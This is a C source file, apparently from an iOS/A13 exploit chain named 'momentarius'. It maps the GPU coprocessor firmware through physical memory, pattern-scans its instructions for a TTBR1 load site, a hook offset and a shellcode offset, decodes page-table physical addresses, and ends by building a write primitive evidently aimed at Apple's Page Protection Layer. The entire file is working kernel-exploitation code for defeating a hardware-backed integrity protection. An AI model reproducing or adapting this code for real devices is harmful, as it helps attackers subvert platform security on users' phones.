#include "momentarius.h"
#include "utils.h"

static int gfx_run_patchfinder(void) {
    uint64_t second_page = map_phys_data(momentarius.gfx.text_pa + 0x4000, 0x4000);
    momentarius.gfx.method = 1;
    
    uint32_t msr = 0xD5182020; // msr TTBR1_EL1, x0
    for (uint64_t i = 0; i < 0x4000; i+=0x4) {
        if (*(volatile uint32_t *)(second_page + i) == msr) {
            momentarius.gfx.method = 2;
            break;
        }
    }
    
    if (momentarius.gfx.method == 2) {
        uint32_t bfxil = 0xB3401C20; // bfxil x0, x1, #0, #8
        for (uint64_t i = 0; i < 0x4000; i+=0x4) {
            if (*(volatile uint32_t *)(second_page + i) == bfxil) {
                momentarius.gfx.ttbr1_load_offset = (uint32_t)(i - 0xc) + 0x4000;
                break;
            }
        }
        
        uint32_t mrs = 0xD5381000; // mrs x0, SCTLR_EL1
        uint32_t sctlr_offset = 0;
        
        for (uint64_t i = 0; i < 0x4000; i+=0x4) {
            if (*(volatile uint32_t *)(second_page + i) == mrs) {
                sctlr_offset = (uint32_t)i;
                break;
            }
        }
        
        if (sctlr_offset != 0) {
            uint32_t cmp_x1 = 0xF100003F; // cmp x1, #0
            uint32_t start = sctlr_offset + 0x4;
            
            for (uint64_t i = start; i < 0x4000-0x4; i+=0x4) {
                if (*(volatile uint32_t *)(second_page + i) == cmp_x1) {
                    momentarius.gfx.hook_offset = (uint32_t)i + 0x4000;
                    break;
                }
            }
        }
    } else {
        uint32_t cmp_x0 = 0xF100001F; // cmp x0, #0
        for (uint64_t i = 0; i < 0x4000-0x4; i+=0x4) {
            if (*(volatile uint32_t *)(second_page + i) == cmp_x0) {
                uint32_t next = *(volatile uint32_t *)(second_page + i + 0x4);
                if ((next & A64_B_COND_MASK) == A64_B_COND_OPCODE) {
                    momentarius.gfx.ttbr1_load_offset = (uint32_t)i + 0x4000;
                    break;
                }
            }
        }
        
        if (momentarius.gfx.ttbr1_load_offset != 0) {
            uint32_t cmp_x1 = 0xF100003F; // cmp x1, #0
            uint32_t start = (momentarius.gfx.ttbr1_load_offset - 0x4000) + 0x4;
            
            for (uint64_t i = start; i < 0x4000-0x4; i+=0x4) {
                if (*(volatile uint32_t *)(second_page + i) == cmp_x1) {
                    momentarius.gfx.hook_offset = (uint32_t)i + 0x4000;
                    break;
                }
            }
        }
    }
    
    if (momentarius.gfx.ttbr1_load_offset == 0) return -1;
    if (momentarius.gfx.hook_offset == 0) return -1;
    momentarius.gfx.shc_offset = 0x2000; // seems like 0x2000 is always usable
    
    debug_log("ttbr1_load_offset: 0x%x\n", momentarius.gfx.ttbr1_load_offset);
    debug_log("hook_offset: 0x%x\n", momentarius.gfx.hook_offset);
    debug_log("shc_offset: 0x%x\n", momentarius.gfx.shc_offset);
    return 0;
}

int momentarius_init_A13(void) {
    uint64_t mapping = map_phys_data(momentarius.gfx.text_pa, 0x4000);
    if (mapping == 0) return -1;
    uint64_t info_offset = 0;
    
    for (uint32_t i = 0; i < 0x4000; i+=0x8) {
        if (*(volatile uint64_t *)(mapping + i) == 0x7777777777777700) {
            info_offset = i + 0x8;
            break;
        }
    }
    
    debug_log("info_offset: 0x%llx\n", info_offset);
    if (info_offset == 0) return -1;
    uint64_t info_struct = mapping + info_offset;
    momentarius.gfx.data_va = *(volatile uint64_t *)(info_struct - 0x28);
    debug_log("data_va: 0x%llx\n", momentarius.gfx.data_va);
    
    momentarius.gfx.data_size = *(volatile uint64_t *)(info_struct - 0x20) - momentarius.gfx.data_va;
    debug_log("data_size: 0x%llx\n", momentarius.gfx.data_size);
    
    momentarius.gfx.text_size = momentarius.gfx.data_va - momentarius.gfx.text_va;
    debug_log("text_size: 0x%llx\n", momentarius.gfx.text_size);
    
    uint64_t encoded_data_addr = *(volatile uint64_t *)info_struct;
    debug_log("encoded_data_addr: 0x%llx\n", encoded_data_addr);
    
    uint64_t encoded_ttbr_addr = *(volatile uint64_t *)(info_struct + 0x38);
    debug_log("encoded_ttbr_addr: 0x%llx\n", encoded_ttbr_addr);
    
    if ((encoded_data_addr - momentarius.gfx.text_va) >= momentarius.gfx.text_size ||
        (encoded_ttbr_addr - momentarius.gfx.text_va) >= momentarius.gfx.text_size) return -1;
    
    uint64_t unshifted_data_pa = map_physread64(momentarius.gfx.text_pa + (encoded_data_addr - momentarius.gfx.text_va));
    debug_log("unshifted_data_pa: 0x%llx\n", unshifted_data_pa);
    
    uint64_t unshifted_ttbr_pa = map_physread64(momentarius.gfx.text_pa + (encoded_ttbr_addr - momentarius.gfx.text_va));
    debug_log("unshifted_ttbr_pa: 0x%llx\n", unshifted_ttbr_pa);
    
    uint64_t phys_shift = 0;
    uint8_t *unshifted_data = (uint8_t *)&unshifted_data_pa;
    uint8_t *unshifted_ttbr = (uint8_t *)&unshifted_ttbr_pa;
    
    do {
        uint8_t data_val = *unshifted_data++;
        momentarius.gfx.data_pa |= (uint64_t)data_val << phys_shift;
        
        uint8_t ttbr_val = *unshifted_ttbr++;
        momentarius.gfx.ttbr_pa |= (uint64_t)ttbr_val << phys_shift;
        phys_shift += 8;
    } while (phys_shift != 64);
    
    debug_log("data_pa: 0x%llx\n", momentarius.gfx.data_pa);
    debug_log("ttbr_pa: 0x%llx\n", momentarius.gfx.ttbr_pa);
    
    if ((momentarius.gfx.ttbr_kva = gfx_phystokv(momentarius.gfx.ttbr_pa)) == 0) return -1;
    debug_log("ttbr_kva: 0x%llx\n", momentarius.gfx.ttbr_kva);

    if (gfx_run_patchfinder() != 0) return -1;
    return momentarius_build_ppl_write();
}
